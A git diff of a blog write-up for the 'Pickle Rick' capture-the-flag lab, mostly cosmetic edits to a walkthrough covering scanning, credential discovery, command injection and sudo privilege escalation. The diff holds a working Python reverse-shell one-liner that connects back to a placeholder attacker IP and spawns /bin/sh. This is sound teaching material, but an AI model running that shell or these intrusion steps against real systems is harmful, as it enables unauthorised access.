@@ -32,8 +32,8 @@ This is an easy challenge that can teach you directory scanning, command injecti
 
 let's start with the Nmap scan.
 
-```
-Nmap -p- -A -T4 10.10.159.88 -oN nmap/fullscan
+```bash
+nmap -p- -A -T4 10.10.159.88 -oN nmap/fullscan
 ```
 
 ![nmap](/assets/images/picklerick/picklericknmap.png)
@@ -48,13 +48,13 @@ This may take a while. Why not grab a juice?
 
 ![](/assets/images/picklerick/picklerick2.png)
 
-Nothing interesting here, let's check the source code?
+Nothing interesting here, let's check the source code!.
 
 ![](/assets/images/picklerick/picklericksource.png)
 
-There's a comment by Rick. His Username is **R1ckRul3s.** Hmm a username? there's no login page for username. Maybe SSH login?. let's try it.
+There's a comment by Rick. His Username is **R1ckRul3s.** Hmmm a username? there's no login page to use the username. Maybe SSH login?. let's try it.
 
-```
+```bash
 ssh R1ckRul3s@10.10.159.88
 ```
 
@@ -66,7 +66,7 @@ SSH is kicking us out. We cant use SSH now.
 
 # Directory Scanning
 
-Lets fire up the **Dirbuster** and scan the directories. I tried looking for **PHP** and **txt** files.
+Lets fire up the **Dirbuster** and scan the directories. I tried looking for **php** and **txt** files.
 
 ![](/assets/images/picklerick/picklerickds.png)
 
@@ -84,13 +84,13 @@ Let's check **robots.txt** file.
 
 ![](/assets/images/picklerick/picklerickrobots.png)
 
-`Wubbalubbadubdub` ? Interesting, maybe a password? Let's save it, it may come handy later.
+`Wubbalubbadubdub` ? Interesting, maybe a password? Let's save it, It may come handy later.
 
 ![](https://media.giphy.com/media/l41lI4bYmcsPJX9Go/giphy.gif)
 
 Now lets check **login.php**
 
-A login page finally!, let's try the username `R1ckRul3s` and `Wubbalubbadubdub`.
+A login page finally!, let's try the username `R1ckRul3s` and the password `Wubbalubbadubdub`.
 
 ![](/assets/images/picklerick/picklericklogin.png)
 
@@ -126,7 +126,7 @@ Uh oh!. We can't use `cat` command. Let's try `less` command then.
 
 ![](/assets/images/picklerick/picklerickciless.png)
 
-Ah! Finally an ingredient found. 2 more to go. Hold on Rick!.
+Ah! Finally one ingredient found. 2 more to go. Hold on Rick!.
 
 ![](https://media.giphy.com/media/Rgo50jdPhiJRiGQH9C/giphy.gif)
 
@@ -134,9 +134,7 @@ Ah! Finally an ingredient found. 2 more to go. Hold on Rick!.
 
 # Reverse Shell
 
-Since we have command injection ability, let's get a reverse shell. Head to \[Pentestmonkey reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
-
-> Python 2 wasn't available but python 3 was. So I tired reverse shell with python 3
+Since we have command injection ability, let's get a reverse shell. Head to [Pentestmonkey reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 Start a netcat listener in the terminal.
 
@@ -144,35 +142,38 @@ Start a netcat listener in the terminal.
 
 and run 
 
-```
+```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-> Replace your IP address with <YOUR IP>
+> Python 2 wasn't available but python 3 was. So I tired reverse shell with python 3.
+> Replace your IP address with \<YOUR IP\>
 
-And we got the reverse shell!
+And we got the shell! 💪
 
 ![](/assets/images/picklerick/picklerickshell1.png)
 
 Now let's find other ingredients.
 
-`ls /home` revealed **rick** folder.
+`ls /home` revealed the **rick** folder.
 
 ![](/assets/images/picklerick/picklerickshell2.png)
 
-let's check the rick folder.
+let's check the /rick folder.
 
 ![](/assets/images/picklerick/picklerickshell3.png)
 
-It seems like we got 2nd ingredient!.
+Huh! the second ingredient. cool.
 
 ![](/assets/images/picklerick/picklerickshell4.png)
 
 The 2nd Ingredient is **1 jerry tear**.
 
-\> I checked for 3rd ingredient but unfortunately i can't able to find it. It seems like it is hidden inside /root folder. We need the root access to get the 3rd ingredient.
-## Privilege Escalation
-Let's check if we have any root access.run 
+> I checked for 3rd ingredient but unfortunately i can't able to find it. It seems like it is hidden inside /root folder. We need the root access to get the 3rd ingredient.
+
+# Privilege Escalation
+
+Let's check if we have any root access. 
 
 `sudo -l`
 
@@ -223,7 +224,7 @@ And we are Done!. Hurray!
 * sudo /bin/bash to obtain a root shell.
 * The /root folder contained the 3rd ingredient.
 
-## Before you leave
+# Before you leave
 
 If you have any constructive criticism or any questions, please drop an email at [root@n0nu11.tech](mailto:root@n0nu11.tech) or ping me in [instagram](https://instagram.com/dvlp.er). I'll be happy to hear your feedback.
 
